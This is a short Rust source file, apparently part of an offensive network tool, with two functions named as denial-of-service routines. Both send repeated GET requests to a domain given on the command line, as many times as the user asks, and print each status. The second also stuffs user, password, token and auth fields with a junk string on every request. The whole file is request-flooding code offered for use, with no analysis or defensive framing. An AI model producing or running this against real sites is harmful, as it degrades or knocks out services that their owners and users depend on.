use crate::core::core::*;
use crate::modules::network::structs::*;
use std::collections::HashMap;

pub fn dos_simple_get_span(argsv: &[String]) -> i32 {
    let mut req = Request::new();
    req.url = search_value("domain", argsv);
    req.method = "GET".to_string();

    let times = seach_number_value("times", argsv);

    for _i in 0..times {
        let out = req.make();
        println!("{} - {}", out.url, out.status);
    }
    0
}

pub fn dos_long_auth_span(argsv: &[String]) -> i32 {
    // let size = seach_number_value("size", argsv);
    let seed = "3l34_=3k4vç~4vu,,20-v";
    let mut req = Request::new();
    req.url = search_value("domain", argsv);
    req.method = "GET".to_string();
    req.body = Some(HashMap::from([
        ("user", seed),
        ("pass", seed),
        ("username", seed),
        ("password", seed),
        ("token", seed),
        ("auth", seed),
    ]));

    let times = seach_number_value("times", argsv);

    for _i in 0..times {
        let out = req.make();
        println!("{} - {}", out.url, out.status);
    }
    0
}
